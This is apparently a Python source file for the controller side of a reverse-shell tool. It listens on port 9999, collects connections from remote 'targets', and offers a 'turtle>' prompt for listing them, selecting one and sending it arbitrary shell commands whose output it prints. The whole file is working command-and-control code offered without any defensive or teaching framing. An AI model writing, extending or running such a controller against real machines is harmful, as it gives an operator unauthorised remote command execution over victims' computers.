from base64 import encode
import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []

# Creating a socket
def create_socket():
    try:
        global host
        global port 
        global s

        host = ""
        port = 9999

        s = socket.socket()

    except socket.error as msg :
        print ("Socket creation error : " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error : " + str(msg) + "\nRetrying...\n")
        bind_socket();
        

# First thread function - to accept connections and store them
def accept_sockets():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_addresses[:]

    global keep_listening
    
    keep_listening = True

    while keep_listening:
        try:
            conn, address = s.accept();
            s.setblocking(1);

            all_connections.append(conn)
            all_addresses.append(address)

        except:
            print("error occured accepting connection") 


# Making a shell to choose from connected targets
def start_shell():
    global s
    global keep_listening

    print()

    while True:
        cmd = input("turtle> ").strip()

        if cmd == 'list':
            list_connections()

        elif cmd == 'exit':
            for i, conn in enumerate(all_connections):
                conn.send(str.encode('exit'))
                conn.close()
                del all_connections[i]
                del all_addresses[i]
            
            s.close()
            keep_listening = False
            break

        elif cmd[:6] == 'select':
            conn = get_target(cmd)

            if conn is not None:
                send_target_commands(conn)  
            else :
                list_connections()
        
        else :
            print("Command not recognised\n")
            

# Returns list of all connected clients
def list_connections():
    results = ''

    print('\n---------- CLIENTS ----------\n')

    for select_id, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(201480)
        except:
            del all_addresses[select_id]
            del all_connections[select_id]
            continue

        results += f'[{select_id}]  {all_addresses[select_id][0]}  {all_addresses[select_id][1]}\n'

    print(results + '\n')


# Connect to selected target
def get_target(cmd):
    try:
        target = int(cmd[7:].strip())
        if target >= len(all_addresses):
            print("Selection not valid\n")
            return None
        else:
            print('You are now connected to target\n')
            print(f'{all_addresses[target][0]}> ', end='')
            return all_connections[target]
    except:
        print('Error: Invalid selection parameter\n')
        return None


def send_target_commands(conn):
    err_cnt = 0

    while True:
        try:
            cmd = input().strip()
            if(cmd == 'quit'):
                break
            
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                response = str(conn.recv(201480), "utf-8")
                print(response, end='')
                err_cnt = 0

                if(cmd == 'exit'):
                    break
            
        except:
            err_cnt += 1
            print("Error sending command\n")
            print("> ", end="")

            if err_cnt == 3: 
                print("\n....Connection Broken....\n")
                break


def create_jobs():
    for i in range(NUMBER_OF_THREADS):
        queue.put(i+1)

    queue.join()


# Create worker threads
def create_threads():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accept_sockets()
        
        if x == 2:
            start_shell()

        queue.task_done() 


def main():
    create_threads()
    create_jobs()

main()